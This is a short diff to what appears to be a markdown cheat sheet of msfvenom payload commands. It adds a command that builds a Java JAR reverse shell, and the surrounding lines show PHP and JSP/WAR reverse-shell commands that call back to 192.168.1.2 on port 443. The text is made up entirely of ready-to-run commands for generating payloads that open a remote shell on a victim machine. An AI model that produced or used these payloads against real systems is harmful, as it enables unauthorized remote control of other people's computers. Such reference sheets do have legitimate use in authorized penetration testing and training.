@@ -281,6 +281,12 @@ msfvenom -p php/reverse_php LHOST=192.168.1.2 LPORT=443 -f raw > reverse.php
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f war > reverse.war
 ```
 
+`Jar`
+
+```cmd
+msfvenom -p java/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f jar > rshell.jar
+```
+
 `JSP`
 
 ```cmd
